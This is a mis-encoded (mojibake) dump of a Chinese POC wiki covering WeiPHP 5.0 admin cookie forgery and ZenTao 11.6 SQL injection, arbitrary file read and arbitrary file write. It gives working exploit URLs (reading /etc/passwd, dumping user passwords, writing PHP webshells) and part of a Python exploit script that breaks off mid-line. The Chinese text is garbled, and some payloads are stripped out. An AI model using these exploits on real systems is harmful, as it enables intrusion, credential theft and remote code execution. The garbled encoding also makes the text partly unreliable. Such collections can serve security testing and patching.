å­˜åœ¨ç®¡ç†å‘˜ç”¨æˆ·Cookieä¼ªé€ ï¼Œé€šè¿‡æ³„éœ²çš„å¯†é’¥æ•°æ®ï¼Œå¯åˆ©ç”¨åŠ å¯†æ–¹æ³•æ¥å¾—åˆ°ç®¡ç†å‘˜çš„Cookie å½±å“ç‰ˆæœ¬ [!NOTE] Weiphp ç¯å¢ƒæ­å»º weiphp5.0å®˜æ–¹ä¸‹è½½å‚è€ƒæ‰‹å†Œ å‚è€ƒå®˜æ–¹æ‰‹å†Œåˆ›å»ºç½‘ç«™å³å¯ æ¼æ´å¤ç° é¦–å…ˆéœ€è¦å¾—åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­çš„data_auth_keyå¯†é’¥ å¾—åˆ°è¿™ä¸ªé…ç½®æ–‡ä»¶å¯å‚ç…§ä¸Šä¸€ç¯‡Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– 'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' å…¨å±€æŸ¥æ‰¾ä¸‹ä½¿ç”¨äº†è¿™ä¸ªå¯†é’¥çš„åœ°æ–¹ æ‰¾åˆ°äº†è·Ÿæ®è¿™ä¸ªå¯†é’¥çš„åŠ å¯†æ–¹æ³•å’Œè§£å¯†æ–¹æ³• åŠ å¯†æ–¹æ³• think_encrypt function think_encrypt($data, $key = '', $expire = 0) { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i è§£å¯†æ–¹æ³• think_decrypt function think_decrypt($data, $key = '') { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = str_replace(array( '-', '_' ), array( '+', '/' ), $data); $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr('====', $mod4); } $data = base64_decode($data); $expire = substr($data, 0, 10); $data = substr($data, 10); if ($expire > 0 && $expire å…¨å±€æŸ¥çœ‹ä¸‹ä½¿ç”¨äº†è§£å¯†æ–¹æ³•çš„åœ°æ–¹ åœ¨æ–‡ä»¶ application\\common.php ä¸­å«æœ‰ä½¿ç”¨è§£å¯†æ–¹æ³•çš„ä»£ç ï¼Œç”¨äºåšèº«ä»½éªŒè¯ function is_login() { $user = session('user_auth'); if (empty($user)) { $cookie_uid = cookie('user_id'); if (!empty($cookie_uid)) { $uid = think_decrypt($cookie_uid); $userinfo = getUserInfo($uid); D('common/User')->autoLogin($userinfo); $user = session('user_auth'); } } if (empty($user)) { return 0; } else { return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0; } } æ ¹æ®è¿™é‡Œå¾—åˆ°çš„ä»£ç ï¼Œå¯ä»¥çŸ¥é“å½“user_Id=1æ—¶,ä¼šè§£å¯†å¯†é’¥ååˆ¤æ–­æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®åˆ™å¯ä»¥ç™»å½•ç³»ç»Ÿ æˆ‘ä»¬åœ¨æœ¬åœ°ä½¿ç”¨åŠ å¯†ä»£ç åŠ å¯†user_id=1å¾—åˆ°çš„cookieåˆ™å¯ä»¥ç™»å½•ç³»ç»Ÿ æ·»åŠ cookie: user_id=xxxxxxxxå³å¯æˆåŠŸç™»å½• [!NOTE] è·å–å¯†é’¥çš„æ–¹æ³•å‚ç…§ä¸Šä¸€ç¯‡å®¡è®¡æ–‡ç«  WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/","title":"ç¦…é“","keywords":"","body":"ç¦…é“ ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325 ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´.html","title":"ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´","keywords":"","body":"ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° ç¦…é“ 11.6 ç‰ˆæœ¬ä¸­å¯¹ç”¨æˆ·æ¥å£è°ƒç”¨æƒé™è¿‡æ»¤ä¸å®Œå–„ï¼Œå¯¼è‡´è°ƒç”¨æ¥å£æ‰§è¡ŒSQLè¯­å¥å¯¼è‡´SQLæ³¨å…¥ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ 11.6 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨dockerç¯å¢ƒæ­å»º docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 è®¿é—® http://xxx.xxx.xxx.xxx:8084 æŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° å…ˆå¯¹ç¦…é“çš„è°ƒç”¨æµç¨‹è¿›è¡Œåˆ†æ,å…ˆæŸ¥çœ‹ç›®å½•ä¸ºwww/index.phpé¦–é¡µæ–‡ä»¶ä¸­ è¿™é‡Œä½¿ç”¨router::createAppåˆ›å»ºäº†ä¸€ä¸ªAPPå¯¹è±¡ $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); æ¥åˆ°framework/base/router.class.phpæ–‡ä»¶æŸ¥çœ‹åˆ°createAppæ–¹æ³• public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } è¿™é‡ŒNewäº†ä¸€ä¸ªå¯¹è±¡ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è°ƒç”¨æ–¹æ³•(348è¡Œ) åœ¨358è¡Œå¤„è°ƒç”¨äº†setConfigRootæ–¹æ³• $this->setConfigRoot(); public function setConfigRoot() { $this->configRoot = $this->basePath . 'config' . DS; } åœ¨363è¡Œå¤„è°ƒç”¨äº†loadMainConfigæ–¹æ³• $this->loadMainConfig(); public function loadMainConfig() { /* åˆå§‹åŒ–$configå¯¹è±¡ã€‚Init the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this->config = $config; /* åŠ è½½ä¸»é…ç½®æ–‡ä»¶ã€‚ Load the main config file. */ $mainConfigFile = $this->configRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this->triggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } è¿™é‡ŒåŒ…å«äº†é…ç½®æ–‡ä»¶config.phpé…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶ç›®å½•ä¸º/config/config.php åœ¨25è¡Œå®šä¹‰äº†è°ƒç”¨æ–¹æ³• $config->requestType = 'PATH_INFO'; // è¯·æ±‚ç±»å‹ï¼šPATH_INFO|PATHINFO2|GETã€‚ The request type: PATH_INFO|PATH_INFO2|GET. $config->requestFix = '-'; // PATH_INFOå’ŒPATH_INFO2æ¨¡å¼çš„åˆ†éš”ç¬¦ã€‚ The divider in the url when PATH_INFO|PATH_INFO2. $config->moduleVar = 'm'; // è¯·æ±‚ç±»å‹ä¸ºGETï¼šæ¨¡å—å˜é‡åã€‚ requestType=GET: the module var name. $config->methodVar = 'f'; // è¯·æ±‚ç±»å‹ä¸ºGETï¼šæ¨¡å—å˜é‡åã€‚ requestType=GET: the method var name. $config->viewVar = 't'; // è¯·æ±‚ç±»å‹ä¸ºGETï¼šè§†å›¾å˜é‡åã€‚ requestType=GET: the view var name. $config->sessionVar = 'zentaosid'; // è¯·æ±‚ç±»å‹ä¸ºGETï¼šsessionå˜é‡åã€‚ requestType=GET: the session var name. $config->views = ',html,json,mhtml,xhtml,'; // æ”¯æŒçš„è§†å›¾ç±»å‹ã€‚ Supported view formats. å¯ä»¥å‘ç°è¿™é‡Œå­˜åœ¨ä¸¤ç§è·¯ç”±PATH_INFO|PATH_INFO2ï¼šä¸€ç§æ˜¯mã€fã€tæ¥è¿›è¡Œè°ƒç”¨ã€‚å¦å¤–ä¸€ç§æ˜¯é€šè¿‡-æ¥è¿›è¡Œè°ƒç”¨ åœ¨index.phpä¸­çš„66è¡Œ $app->parseRequest(); public function parseRequest() { if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2') { $this->parsePathInfo(); $this->setRouteByPathInfo(); } elseif($this->config->requestType == 'GET') { $this->parseGET(); $this->setRouteByGET(); } else { $this->triggerError(\"The request type {$this->config->requestType} not supported\", __FILE__, __LINE__, $exit = true); } } çœ‹åˆ°è¿™ä¸€æ¡åˆ™æ˜¯åˆ¤æ–­åŠ›ä¸¤ç§è°ƒç”¨æ–¹æ³• $this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2' è·Ÿè¿›setRouteByPathInfoæ–¹æ³• public function setRouteByPathInfo() { if(!empty($this->URI)) { /* * æ ¹æ®$requestFixåˆ†å‰²ç¬¦ï¼Œåˆ†å‰²ç½‘å€ã€‚ * There's the request seperator, split the URI by it. **/ if(strpos($this->URI, $this->config->requestFix) !== false) { $items = explode($this->config->requestFix, $this->URI); $this->setModuleName($items[0]); $this->setMethodName($items[1]); } /* * å¦‚æœç½‘å€ä¸­æ²¡æœ‰åˆ†éš”ç¬¦ï¼Œä½¿ç”¨é»˜è®¤çš„æ–¹æ³•ã€‚ * No reqeust seperator, use the default method name. **/ else { $this->setModuleName($this->URI); $this->setMethodName($this->config->default->method); } } else { $this->setModuleName($this->config->default->module); // ä½¿ç”¨é»˜è®¤æ¨¡å— use the default module. $this->setMethodName($this->config->default->method); // ä½¿ç”¨é»˜è®¤æ–¹æ³• use the default method. } $this->setControlFile(); } æ‰€ä»¥å¯ä»¥æ¨æ–­å‡ºè°ƒç”¨çš„æ–¹æ³• ä¾‹å¦‚ç™»å½•é¡µé¢æœ‰ä¸¤ç§è®¿é—®æ–¹æ³• http://xxx.xxx.xxx.xxx/index.php?m=user&f=login http://xxx.xxx.xxx.xxx/user-login.html å†çœ‹ä¸€ä¸‹checkPrivæ–¹æ³• public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } è¿™é‡Œæ£€æµ‹äº†è°ƒç”¨æ¨¡å—å’Œæ–¹æ³•çš„æƒé™ï¼Œå¯ä»¥çŸ¥é“é™¤äº†isOpenMethodä¸­å®šä¹‰çš„å…¬å¼€æ¨¡å—å’Œæ–¹æ³•ä¹‹å¤–ï¼Œå…¶ä»–çš„æ–¹æ³•éƒ½æ˜¯éœ€è¦ç™»å½•çš„ æœ€åæ˜¯$app->loadModule();è¿™æ®µä»£ç  public function loadModule() { $appName = $this->appName; $moduleName = $this->moduleName; $methodName = $this->methodName; /* * å¼•å…¥è¯¥æ¨¡å—çš„controlæ–‡ä»¶ã€‚ * Include the control file of the module. **/ $file2Included = $this->setActionExtFile() ? $this->extActionFile : $this->controlFile; chdir(dirname($file2Included)); helper::import($file2Included); /* * è®¾ç½®controlçš„ç±»åã€‚ * Set the class name of the control. **/ $className = class_exists(\"my$moduleName\") ? \"my$moduleName\" : $moduleName; if(!class_exists($className)) $this->triggerError(\"the control $className not found\", __FILE__, __LINE__, $exit = true); /* * åˆ›å»ºcontrolç±»çš„å®ä¾‹ã€‚ * Create a instance of the control. **/ $module = new $className(); if(!method_exists($module, $methodName)) $this->triggerError(\"the module $moduleName has no $methodName method\", __FILE__, __LINE__, $exit = true); $this->control = $module; /* include default value for module*/ $defaultValueFiles = glob($this->getTmpRoot() . \"defaultvalue/*.php\"); if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file; /* * ä½¿ç”¨åå°„æœºåˆ¶è·å–å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼ã€‚ * Get the default settings of the method to be called using the reflecting. * * */ $defaultParams = array(); $methodReflect = new reflectionMethod($className, $methodName); foreach($methodReflect->getParameters() as $param) { $name = $param->getName(); $default = '_NOT_SET'; if(isset($paramDefaultValue[$appName][$className][$methodName][$name])) { $default = $paramDefaultValue[$appName][$className][$methodName][$name]; } elseif(isset($paramDefaultValue[$className][$methodName][$name])) { $default = $paramDefaultValue[$className][$methodName][$name]; } elseif($param->isDefaultValueAvailable()) { $default = $param->getDefaultValue(); } $defaultParams[$name] = $default; } /** * æ ¹æ®PATH_INFOæˆ–è€…GETæ–¹å¼è®¾ç½®è¯·æ±‚çš„å‚æ•°ã€‚ * Set params according PATH_INFO or GET. */ if($this->config->requestType != 'GET') { $this->setParamsByPathInfo($defaultParams); } else { $this->setParamsByGET($defaultParams); } if($this->config->framework->filterParam == 2) { $_GET = validater::filterParam($_GET, 'get'); $_COOKIE = validater::filterParam($_COOKIE, 'cookie'); } /* è°ƒç”¨è¯¥æ–¹æ³• Call the method. */ call_user_func_array(array($module, $methodName), $this->params); return $module; } é€šè¿‡ä¹‹å‰è·å–çš„moduleNameåŒ…å«å¯¹åº”çš„controlç±»æ–‡ä»¶å¹¶å®ä¾‹åŒ–ï¼Œéšåè°ƒç”¨setParamsByPathInfoæ–¹æ³•ä»è·¯å¾„ä¸­è·å–æ–¹æ³•å¯¹åº”çš„å‚æ•°å€¼ï¼Œæœ€åé€šè¿‡call_user_func_arrayæ–¹æ³•è°ƒç”¨å¯¹åº”controlç±»ä¸­çš„å¯¹åº”æ–¹æ³•å¹¶èµ‹å€¼ã€‚ æˆ‘ä»¬æŸ¥çœ‹module/api/control.phpæ–‡ä»¶ä¸­çš„getModelæ–¹æ³• è¿™é‡Œé€šè¿‡call_user_func_arrayå‡½æ•°è°ƒç”¨æ‰€æœ‰çš„modelæ–‡ä»¶çš„æ‰€æœ‰æ–¹æ³•ã€‚ $result = call_user_func_array(array(&$module, $methodName), $params); å¯ä»¥çœ‹åˆ°module/api/moudel.phpä¸­çš„sqlå‡½æ•° public function sql($sql, $keyField = '') { $sql = trim($sql); if(strpos($sql, ';') !== false) $sql = substr($sql, 0, strpos($sql, ';')); a($sql); if(empty($sql)) return ''; if(stripos($sql, 'select ') !== 0) { return $this->lang->api->error->onlySelect; } else { try { $stmt = $this->dao->query($sql); if(empty($keyField)) return $stmt->fetchAll(); $rows = array(); while($row = $stmt->fetch()) $rows[$row->$keyField] = $row; return $rows; } catch(PDOException $e) { return $e->getMessage(); } } } è¿™é‡Œå¹¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œåªä½¿ç”¨äº†ä»£ç $sql=trim($sql)è¿‡æ»¤äº†ç©ºæ ¼ æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™é‡Œçš„è°ƒç”¨è¿™ä¸ªæ–¹æ³•éœ€è¦çš„æƒé™ è¿™é‡Œå¯ä»¥çœ‹åˆ°ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è°ƒç”¨è¿™ä¸ªæ¨¡å—çš„æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨å®ƒè°ƒç”¨sqlæ–¹æ³•è¿›è¡ŒæŸ¥è¯¢(ç©ºæ ¼è½¬æ¢ä¸º+,ç»•è¿‡è¿‡æ»¤) http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user æˆåŠŸæ‰§è¡Œsqlè¯­å¥ æ¼æ´åˆ©ç”¨POC ç™»é™†åè®¿é—® http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° ç¦…é“ 11.6 ç‰ˆæœ¬ä¸­å¯¹ç”¨æˆ·æ¥å£è°ƒç”¨æƒé™è¿‡æ»¤ä¸å®Œå–„ï¼Œå¯¼è‡´è°ƒç”¨æ¥å£æ‰§è¡ŒSQLè¯­å¥å¯¼è‡´SQLæ³¨å…¥ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ 11.6 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨dockerç¯å¢ƒæ­å»º docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 è®¿é—® http://xxx.xxx.xxx.xxx:8084 æŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° è¿™é‡Œé€ æˆæ¼æ´çš„åŸå› åŒæ ·æ˜¯è°ƒç”¨æ¥å£æƒé™æ— é™åˆ¶çš„åŸå›  æ¥å£å‡ºç°æ¼æ´çš„åŸå› å…·ä½“å‚è€ƒå¯ä»¥æŸ¥çœ‹ä¸Šä¸€ç¯‡ ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ å…³äºæ­¤æ¼æ´çš„å®Œæ•´åˆ†æ ç¬¬ä¸€ç§æ–¹æ³• æŸ¥çœ‹module/file/moudel.phpä¸‹çš„parseCSVæ–¹æ³• public function parseCSV($fileName) { $content = file_get_contents($fileName); /* Fix bug #890. */ $content = str_replace(\"\\x82\\x32\", \"\\x10\", $content); $lines = explode(\"\\n\", $content); $col = -1; $row = 0; $data = array(); foreach($lines as $line) { $line = trim($line); $markNum = substr_count($line, '\"') - substr_count($line, '\\\"'); if(substr($line, -1) != ',' and (($markNum % 2 == 1 and $col != -1) or ($markNum % 2 == 0 and substr($line, -2) != ',\"' and $col == -1))) $line .= ','; $line = str_replace(',\"\",', ',,', $line); $line = str_replace(',\"\",', ',,', $line); $line = preg_replace_callback('/(\\\"{2,})(\\,+)/U', array($this, 'removeInterference'), $line); $line = str_replace('\"\"', '\"', $line); /* if only one column then line is the data. */ if(strpos($line, ',') === false and $col == -1) { $data[$row][0] = trim($line, '\"'); } else { /* if col is not -1, then the data of column is not end. */ if($col != -1) { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] .= \"\\n\" . $line; $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); continue; } else { $data[$row][$col] .= \"\\n\" . substr($line, 0, $pos); $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $line = substr($line, $pos + 2); $col++; } } if($col == -1) $col = 0; /* explode cols with delimiter. */ while($line) { /* the cell has '\"', the delimiter is '\",'. */ if($line{0} == '\"') { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] = substr($line, 1); /* if line is not empty, then the data of cell is not end. */ if(strlen($line) >= 1) continue 2; $line = ''; } else { $data[$row][$col] = substr($line, 1, $pos - 1); $line = substr($line, $pos + 2); } $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); } else { /* the delimiter default is ','. */ $pos = strpos($line, ','); /* if line is not delimiter, then line is the data of cell. */ if($pos === false) { $data[$row][$col] = $line; $line = ''; } else { $data[$row][$col] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } } $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $col++; } } $row ++; $col = -1; } return $data; } è¿™é‡Œå¯ä»¥çœ‹åˆ°ä»¥fileä¸ºæ¨¡å—åã€parseCSVä¸ºæ–¹æ³•åå»è°ƒç”¨è¯»å–æ–‡ä»¶ è¯»å–çš„æ–‡ä»¶å$filenameå‚æ•°å¯æ§ï¼Œä¾‹å¦‚è¯»å–/etc/passwd http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd [!NOTE] æ³¨æ„ä»¥ .php .txt ç»“å°¾çš„ä¼šè¢« /framework/base/router.class.phpä¸­çš„parsePathInfoæ–¹æ³• è¿‡æ»¤ ç¬¬äºŒç§æ–¹æ³• æŸ¥çœ‹module/api/moudel.phpä¸‹çš„getMethodæ–¹æ³• public function getMethod($filePath, $ext = '') { $fileName = dirname($filePath); $className = basename(dirname(dirname($filePath))); if(!class_exists($className)) helper::import($fileName); $methodName = basename($filePath); $method = new ReflectionMethod($className . $ext, $methodName); $data = new stdClass(); $data->startLine = $method->getStartLine(); $data->endLine = $method->getEndLine(); $data->comment = $method->getDocComment(); $data->parameters = $method->getParameters(); $data->className = $className; $data->methodName = $methodName; $data->fileName = $fileName; $data->post = false; $file = file($fileName); for($i = $data->startLine - 1; $i endLine; $i++) { if(strpos($file[$i], '$this->post') or strpos($file[$i], 'fixer::input') or strpos($file[$i], '$_POST')) { $data->post = true; } } return $data; } è¿™é‡Œä¸ç¬¬ä¸€ç§å¤§åŒå°å¼‚ï¼Œåªæ˜¯è°ƒç”¨äº†ä¸åŒæ¨¡å—çš„æ–¹æ³• çœ‹åˆ°$fileName = dirname($filePath);è¿™æ®µåˆ™ä¸ºè¿”å›çš„ç›®å½•å æ‰€ä»¥è¯»å–/etc/passwdåˆ™éœ€è¦å†™ä¸º/etc/passwd/1æ¥ç»•è¿‡ http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´.html","title":"ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´","keywords":"","body":"ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° ç¦…é“ 11.6 ç‰ˆæœ¬ä¸­å¯¹ç”¨æˆ·æ¥å£è°ƒç”¨æƒé™è¿‡æ»¤ä¸å®Œå–„ï¼Œå¯¼è‡´è°ƒç”¨æ¥å£æ‰§è¡ŒSQLè¯­å¥å¯¼è‡´SQLæ³¨å…¥ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ 11.6 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨dockerç¯å¢ƒæ­å»º docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 è®¿é—® http://xxx.xxx.xxx.xxx:8084 æŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° è¿™é‡Œé€ æˆæ¼æ´çš„åŸå› åŒæ ·æ˜¯è°ƒç”¨æ¥å£æƒé™æ— é™åˆ¶çš„åŸå›  æ¥å£å‡ºç°æ¼æ´çš„åŸå› å…·ä½“å‚è€ƒå¯ä»¥æŸ¥çœ‹ä¸Šä¸€ç¯‡ ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ å…³äºæ­¤æ¼æ´çš„å®Œæ•´åˆ†æ æŸ¥çœ‹module/api/ediyor/moudel.phpä¸‹çš„saveæ–¹æ³• public function save($filePath) { $fileContent = $this->post->fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this->lang->editor->notWritable . $extFilePath)); } } $filePathå‚æ•°å’Œ$fileContentå‚æ•° æˆ‘ä»¬æ˜¯å¯æ§çš„ è°ƒç”¨æ–¹æ³•å¾€ /tmpå†™å…¥ä¸€ä¸ªphpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent= åœ¨åˆ©ç”¨ ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ç¬¬äºŒç§æ–¹æ³•æ¥æ–‡ä»¶åŒ…å« http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 ä¹Ÿå¯ä»¥å†™å…¥ç½‘ç«™ç›®å½•ä¸­ å…ˆè·å–åœ°å€ http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POSTï¼šfileContent=');?> è®¿é—®http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 å¾—åˆ°ç›®å½•ä¸º /app/zentaopma/www è¯·æ±‚æ”¹ä¸º http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=');?> å†å»è®¿é—®http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1åˆ™ä¼šå†ç½‘ç«™ç›®å½•ä¸‹ç”Ÿæˆ xxx.php æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: zentao version = 11.6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookieå­—æ®µ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] ç¦…é“ç‰ˆæœ¬ä¸º:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] è·å–ç‰ˆæœ¬å¤±è´¥ \\033[0m\", e) sys.exit(0) def POC_2(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } data = {\"fileContent\":\"\"} write_url = target_url + \"/api-getModel-editor-save-filePath=/tmp/test\" try: response = requests.post(url=write_url, data=data, headers=headers, timeout=10) print(\"\\033[32m[o] å°è¯•å†™å…¥phpæ–‡ä»¶... \\033[0m\") except: print(\"\\033[31m[x] å†™å…¥phpæ–‡ä»¶å¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try: response = requests.get(url=vuln_url, headers=headers, timeout=10) if \"System\" in response.text: print(\"\\033[32m[o] æˆåŠŸå†™å…¥æ–‡ä»¶ï¼Œå­˜åœ¨æ¼æ´, è®¿é—® 